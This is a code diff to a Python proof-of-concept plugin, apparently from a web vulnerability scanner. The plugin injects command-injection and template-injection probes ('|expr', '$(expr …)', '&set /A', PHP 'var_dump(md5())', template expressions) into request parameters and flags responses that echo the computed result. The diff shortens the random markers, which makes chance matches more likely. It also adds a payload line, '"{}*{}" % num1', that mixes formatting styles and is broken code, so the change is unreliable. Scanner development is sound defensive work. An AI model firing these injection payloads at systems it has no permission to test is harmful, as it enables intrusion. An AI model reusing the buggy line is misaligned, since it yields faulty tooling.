@@ -26,40 +26,42 @@ class POC():
         parser = dictdata_parser(self.dictdata)
         params = self.dictdata.get("request").get("params").get("params_url") + \
                  self.dictdata.get("request").get("params").get("params_body")
-        num1 = get_random_num(8)
-        num2 = get_random_num(8)
+        num1 = get_random_num(4)
+        num2 = get_random_num(4)
         num1_num2 = num1 + num2
+        num1num2 = num1 * num2
         num1_md5 = getmd5(num1)
         payloads = (
-            {"cmd": "\nexpr {} + {}\n".format(num1, num2), "show": num1_num2,"method":"a"},
-            {"cmd": "|expr {} + {}".format(num1,num2), "show":num1_num2,"method":"a"},
-            {"cmd": "$(expr {} + {})".format(num1,num2), "show": num1_num2,"method":"a"},
-            {"cmd": "&set /A {}+{}".format(num1,num2), "show": num1_num2,"method":"a"},
-            {"cmd": "${@var_dump(md5(%s))};"%num1, "show": num1_md5,"method":"w"},
-            {"cmd": "'-var_dump(md5(%s))-'"%num1, "show": num1_md5,"method":"w"},
-            {"cmd": "/*1*/{{%s+%s}}"%(num1,num2), "show": num1_num2, "method": "w"},
-            {"cmd": "${%s+%s}"%(num1,num2), "show": num1_num2, "method": "w"},
-            {"cmd": "${(%s+%s)?c}"%(num1,num2), "show": num1_num2, "method": "w"},
-            {"cmd": "#set($c=%s+%s)${c}$c"%(num1,num2), "show": num1_num2, "method": "w"},
-            {"cmd": "<%- {}+{} %>".format(num1,num2), "show": num1_num2, "method": "w"},
+            {"cmd": "\nexpr {} + {}\n".format(num1, num2), "show": num1_num2, "method": "a"},
+            {"cmd": "|expr {} + {}".format(num1, num2), "show": num1_num2, "method": "a"},
+            {"cmd": "$(expr {} + {})".format(num1, num2), "show": num1_num2, "method": "a"},
+            {"cmd": "&set /A {}+{}".format(num1, num2), "show": num1_num2, "method": "a"},
+            {"cmd": "${@var_dump(md5(%s))};" % num1, "show": num1_md5, "method": "w"},
+            {"cmd": "{}*{}" % num1, "show": num1num2, "method": "w"},
+            {"cmd": "'-var_dump(md5(%s))-'" % num1, "show": num1_md5, "method": "w"},
+            {"cmd": "/*1*/{{%s+%s}}" % (num1, num2), "show": num1_num2, "method": "w"},
+            {"cmd": "${%s+%s}" % (num1, num2), "show": num1_num2, "method": "w"},
+            {"cmd": "${(%s+%s)?c}" % (num1, num2), "show": num1_num2, "method": "w"},
+            {"cmd": "#set($c=%s+%s)${c}$c" % (num1, num2), "show": num1_num2, "method": "w"},
+            {"cmd": "<%- {}+{} %>".format(num1, num2), "show": num1_num2, "method": "w"},
         )
         if params:
             for param in params:
                 for payload in payloads:
-                    req = parser.getreqfromparam(param, text=payload.get("cmd"),method=payload.get("method"))
-                    r=request(**req)
-                    if r!=None and str(payload.get("show")) in r.text:
-                        parser_=response_parser(r)
+                    req = parser.getreqfromparam(param, text=payload.get("cmd"), method=payload.get("method"))
+                    r = request(**req)
+                    if r != None and str(payload.get("show")) in r.text:
+                        parser_ = response_parser(r)
                         self.result.append({
                             "name": self.name,
                             "url": parser_.geturl(),
                             "level": self.level,  # 0:Low  1:Medium 2:High
                             "detail": {
                                 "vulmsg": self.vulmsg,
-                                "param":param.get("name"),
-                                "payload":payload,
-                                "request":parser_.getrequestraw(),
-                                "response":parser_.getresponseraw()
+                                "param": param.get("name"),
+                                "payload": payload,
+                                "request": parser_.getrequestraw(),
+                                "response": parser_.getresponseraw()
                             }
                         })
                         break
